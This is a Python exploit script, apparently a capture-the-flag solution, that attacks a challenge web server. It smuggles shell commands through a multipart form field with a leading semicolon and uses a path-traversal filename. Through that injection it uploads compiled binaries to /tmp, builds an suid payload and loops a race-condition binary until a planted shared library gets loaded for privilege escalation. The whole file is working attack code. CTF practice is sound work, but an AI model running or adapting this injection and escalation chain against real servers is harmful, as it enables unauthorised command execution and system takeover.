import argparse
import shlex
import socket
import subprocess

from contextlib import closing, contextmanager

REQUEST_BODY_TMPL = '''
-----------------------------BOUNDARY\r
Content-Disposition: form-data; name="filename"\r
\r
; {cmd} \r
-----------------------------BOUNDARY\r
Content-Disposition: form-data; name="file1"; filename="../c/test.txt"\r
Content-Type: text/plain\r
\r
here is some text
\r
'''.lstrip()

REQUEST_TMPL = '''
POST / HTTP/1.1\r
Content-Type: multipart/form-data; boundary=---------------------------BOUNDARY\r
Content-Length: {body_len}\r
\r
{body}'''.lstrip()


@contextmanager
def running_cmd(cmd, host, port):
    req_body = REQUEST_BODY_TMPL.format(cmd=cmd)
    req = REQUEST_TMPL.format(body_len=len(req_body), body=req_body)

    with closing(socket.create_connection((host, port))) as s:
        s.sendall(req.encode('utf8'))
        yield s


def send_file(fname, host, port):
    cmd = 'cat >/tmp/{fname} <&4'.format(fname=fname)

    with open(fname, 'rb') as f:
        fcontents = f.read()

    with running_cmd(cmd, host, port) as s:
        s.sendall(fcontents)
        s.shutdown(socket.SHUT_WR)
        s.recv(4096)


def exec_command(cmd, host, port):
    with running_cmd(cmd, host, port) as s:
        s.shutdown(socket.SHUT_WR)
        s.recv(4096)


def main():
    parser = argparse.ArgumentParser(description='Get a flag')
    parser.add_argument('hostname',
                        help='Hostname of challenge server to connect to')
    parser.add_argument('port',
                        type=int,
                        help='Port on challenge server to connect to')
    args = parser.parse_args()

    print('[*] Compiling libw.so, race binaries')
    subprocess.check_call(shlex.split('gcc -shared -o libw.so libw.c'))
    subprocess.check_call(shlex.split('gcc -static -o race race.c'))

    print('[*] Uploading binaries')
    send_file('libw.so', args.hostname, args.port)
    send_file('race', args.hostname, args.port)

    print('[*] Creating out.dius with suid payload')
    exec_command(('/bin/bash -c "'
                  'dius crw out.dius n:/tmp/libw.so && '
                  'cp /challenge/www/dius/out.dius /tmp"'), args.hostname,
                 args.port)

    print('[*] Triggering race condition to create /challenge/www/c/libw.so')
    exec_command(
        ('/bin/bash -c "'
         'cd /challenge/www/c && chmod +x /tmp/race && '
         'while [[ ! -f ./libw.so ]]; do /tmp/race; sleep 0.1; done"'),
        args.hostname, args.port)

    print('[*] Triggering load of libw.so')
    with running_cmd('dius crw whatever.dius w:/tmp/libw.so >&4 2>&1',
                     args.hostname, args.port) as s:
        print(s.recv(4096).decode('utf8'))


if __name__ == '__main__':
    main()
